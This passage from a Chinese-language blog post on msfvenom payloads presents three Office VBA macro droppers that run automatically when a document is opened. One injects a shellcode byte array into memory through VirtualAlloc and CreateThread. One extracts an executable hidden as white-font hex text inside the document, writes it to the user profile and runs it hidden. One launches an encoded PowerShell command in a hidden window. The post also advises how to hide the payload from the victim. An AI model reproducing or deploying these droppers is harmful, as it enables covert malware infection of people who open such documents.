+<span class="line"><span>	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As LongPtr, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As LongPtr</span></span>
+<span class="line"><span>	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As LongPtr</span></span>
+<span class="line"><span>	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Foz As LongPtr, ByRef Jwgy As Any, ByVal Ave As Long) As LongPtr</span></span>
+<span class="line"><span>#Else</span></span>
+<span class="line"><span>	Private Declare Function CreateThread Lib "kernel32" (ByVal Dqarj As Long, ByVal Ugoinxes As Long, ByVal Rnynjmirt As Long, Voc As Long, ByVal Ehoghklrh As Long, Ybsykabhv As Long) As Long</span></span>
+<span class="line"><span>	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Uzi As Long, ByVal Rfewcsbud As Long, ByVal Xdydsi As Long, ByVal Ranjbjyup As Long) As Long</span></span>
+<span class="line"><span>	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Foz As Long, ByRef Jwgy As Any, ByVal Ave As Long) As Long</span></span>
+<span class="line"><span>#EndIf</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Sub Auto_Open()</span></span>
+<span class="line"><span>	Dim Pkwkdexzr As Long, Mcpo As Variant, Cggw As Long</span></span>
+<span class="line"><span>#If Vba7 Then</span></span>
+<span class="line"><span>	Dim  Ekfzpnfyt As LongPtr, Udtzjekhw As LongPtr</span></span>
+<span class="line"><span>#Else</span></span>
+<span class="line"><span>	Dim  Ekfzpnfyt As Long, Udtzjekhw As Long</span></span>
+<span class="line"><span>#EndIf</span></span>
+<span class="line"><span>	Mcpo = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183......)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>	Ekfzpnfyt = VirtualAlloc(0, UBound(Mcpo), &#x26;H1000, &#x26;H40)</span></span>
+<span class="line"><span>	For Cggw = LBound(Mcpo) To UBound(Mcpo)</span></span>
+<span class="line"><span>		Pkwkdexzr = Mcpo(Cggw)</span></span>
+<span class="line"><span>		Udtzjekhw = RtlMoveMemory(Ekfzpnfyt + Cggw, Pkwkdexzr, 1)</span></span>
+<span class="line"><span>	Next Cggw</span></span>
+<span class="line"><span>	Udtzjekhw = CreateThread(0, 0, Ekfzpnfyt, 0, 0, 0)</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span>Sub AutoOpen()</span></span>
+<span class="line"><span>	Auto_Open</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span>Sub Workbook_Open()</span></span>
+<span class="line"><span>	Auto_Open</span></span>
+<span class="line"><span>End Sub</span></span></code></pre>
+<h2 id="vba-exe">vba-exe</h2>
+<p>分为 loader 和 shellcode 两部分, 运行时 loader 将从 doc 文档内容里获取 shellcode, 然后保存为 exe 执行.</p>
+<p>打开 doc 文档后将 payload 粘贴至文档末尾, 然后将字体颜色调为白色.</p>
+<p>如果显示红色下划线就把 loader 和 payload 里的定位符 (这里是 Hmnywqavfc) 改成常用的单词.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>'* loader</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Sub Auto_Open()</span></span>
+<span class="line"><span>	Cseed12</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Sub Cseed12()</span></span>
+<span class="line"><span>	Dim Cseed7 As Integer</span></span>
+<span class="line"><span>	Dim Cseed1 As String</span></span>
+<span class="line"><span>	Dim Cseed2 As String</span></span>
+<span class="line"><span>	Dim Cseed3 As Integer</span></span>
+<span class="line"><span>	Dim Cseed4 As Paragraph</span></span>
+<span class="line"><span>	Dim Cseed8 As Integer</span></span>
+<span class="line"><span>	Dim Cseed9 As Boolean</span></span>
+<span class="line"><span>	Dim Cseed5 As Integer</span></span>
+<span class="line"><span>	Dim Cseed11 As String</span></span>
+<span class="line"><span>	Dim Cseed6 As Byte</span></span>
+<span class="line"><span>	Dim Hmnywqavfc as String</span></span>
+<span class="line"><span>	Hmnywqavfc = "Hmnywqavfc"</span></span>
+<span class="line"><span>	Cseed1 = "SqfibJKpmkMGwu.exe"</span></span>
+<span class="line"><span>	Cseed2 = Environ("USERPROFILE")</span></span>
+<span class="line"><span>	ChDrive (Cseed2)</span></span>
+<span class="line"><span>	ChDir (Cseed2)</span></span>
+<span class="line"><span>	Cseed3 = FreeFile()</span></span>
+<span class="line"><span>	Open Cseed1 For Binary As Cseed3</span></span>
+<span class="line"><span>	For Each Cseed4 in ActiveDocument.Paragraphs</span></span>
+<span class="line"><span>		DoEvents</span></span>
+<span class="line"><span>			Cseed11 = Cseed4.Range.Text</span></span>
+<span class="line"><span>		If (Cseed9 = True) Then</span></span>
+<span class="line"><span>			Cseed8 = 1</span></span>
+<span class="line"><span>			While (Cseed8 &#x3C; Len(Cseed11))</span></span>
+<span class="line"><span>				Cseed6 = Mid(Cseed11,Cseed8,4)</span></span>
+<span class="line"><span>				Put #Cseed3, , Cseed6</span></span>
+<span class="line"><span>				Cseed8 = Cseed8 + 4</span></span>
+<span class="line"><span>			Wend</span></span>
+<span class="line"><span>		ElseIf (InStr(1,Cseed11,Hmnywqavfc) > 0 And Len(Cseed11) > 0) Then</span></span>
+<span class="line"><span>			Cseed9 = True</span></span>
+<span class="line"><span>		End If</span></span>
+<span class="line"><span>	Next</span></span>
+<span class="line"><span>	Close #Cseed3</span></span>
+<span class="line"><span>	Cseed13(Cseed1)</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Sub Cseed13(Cseed10 As String)</span></span>
+<span class="line"><span>	Dim Cseed7 As Integer</span></span>
+<span class="line"><span>	Dim Cseed2 As String</span></span>
+<span class="line"><span>	Cseed2 = Environ("USERPROFILE")</span></span>
+<span class="line"><span>	ChDrive (Cseed2)</span></span>
+<span class="line"><span>	ChDir (Cseed2)</span></span>
+<span class="line"><span>	Cseed7 = Shell(Cseed10, vbHide)</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Sub AutoOpen()</span></span>
+<span class="line"><span>	Auto_Open</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Sub Workbook_Open()</span></span>
+<span class="line"><span>	Auto_Open</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>'* payload</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Hmnywqavfc</span></span>
+<span class="line"><span>&#x26;H4D&#x26;H5A&#x26;H90&#x26;H00&#x26;H03&#x26;H00&#x26;H00&#x26;H00&#x26;H04&#x26;H00&#x26;H00&#x26;H00&#x26;HFF&#x26;HFF&#x26;H00&#x26;H00&#x26;HB8&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H40&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00&#x26;H00......</span></span></code></pre>
+<h2 id="vba-psh">vba-psh</h2>
+<p>调用 powershell 执行 shellcode.</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Sub zfx88nq1O()</span></span>
+<span class="line"><span>  Dim neqc</span></span>
+<span class="line"><span>  neqc = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3A......"</span></span>
+<span class="line"><span>  Call Shell(neqc, vbHide)</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span>Sub AutoOpen()</span></span>
+<span class="line"><span>  zfx88nq1O</span></span>
+<span class="line"><span>End Sub</span></span>
+<span class="line"><span>Sub Workbook_Open()</span></span>
+<span class="line"><span>  zfx88nq1O</span></span>
+<span class="line"><span>End Sub</span></span></code></pre> </article> <hr class="my-8 border-dashed"> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/archives/msfvenom-uncommon-payloads.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/metasploit/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>Metasploit</span> </a> </li><li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/power-shell/" class="relative pe-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 focus-visible:no-underline text-sm" data-astro-transition-scope="astro-36ssibgs-3"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -me-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>PowerShell</span> </a> </li> </ul> <div id="btt-btn-container" class="fixed end-4 bottom-8 z-50 md:sticky md:end-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"> <button data-button="back-to-top" class="group relative bg-background px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"> <span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90 md:hidden"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span class="sr-only text-sm group-hover:text-accent md:not-sr-only"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 5l0 14" /><path d="M16 9l-4 -4" /><path d="M8 9l4 -4" /></svg>
+Back To Top
+</span> </button> </div> <script data-astro-rerun>
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    // Attach click event handler for back-to-top button
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+
+    // Handle button visibility according to scroll position
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script> <div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post on:</span><div class="text-center"><a href="https://wa.me/?text=https://exp10it.io/posts/msfvenom-uncommon-payloads/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg><span class="sr-only">Share this post via WhatsApp</span></a><a href="https://www.facebook.com/sharer.php?u=https://exp10it.io/posts/msfvenom-uncommon-payloads/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Facebook"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://exp10it.io/posts/msfvenom-uncommon-payloads/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on X"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://exp10it.io/posts/msfvenom-uncommon-payloads/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg><span class="sr-only">Share this post via Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://exp10it.io/posts/msfvenom-uncommon-payloads/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&#38;body=https://exp10it.io/posts/msfvenom-uncommon-payloads/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg><span class="sr-only">Share this post via email</span></a></div></div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 sm:grid-cols-2"> <a href="/posts/credentials-phish-with-http-request" class="flex w-full gap-1 hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">带有 HTTP 请求的 CredentialsPhish</div> </div> </a> <a href="/posts/nishang-usage" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"> <div> <span>Next Post</span> <div class="text-sm text-accent/85">后渗透框架 nishang</div> </div> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 6l6 6l-6 6" /></svg> </a> </div> </main> <footer class="w-full mt-auto"> <div class="mx-auto max-w-app px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on GitHub"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only">X1r0z Blog on GitHub</span> </a><a href="https://x.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on X"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg> <span class="sr-only">X1r0z Blog on X</span> </a><a href="https://www.linkedin.com/in/x1r0z/" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on LinkedIn"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg> <span class="sr-only">X1r0z Blog on LinkedIn</span> </a><a href="mailto:i@exp10it.io" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to X1r0z Blog"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to X1r0z Blog</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2026</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      // Check if --file-name-offset custom property exists
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      // Determine the top positioning class
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
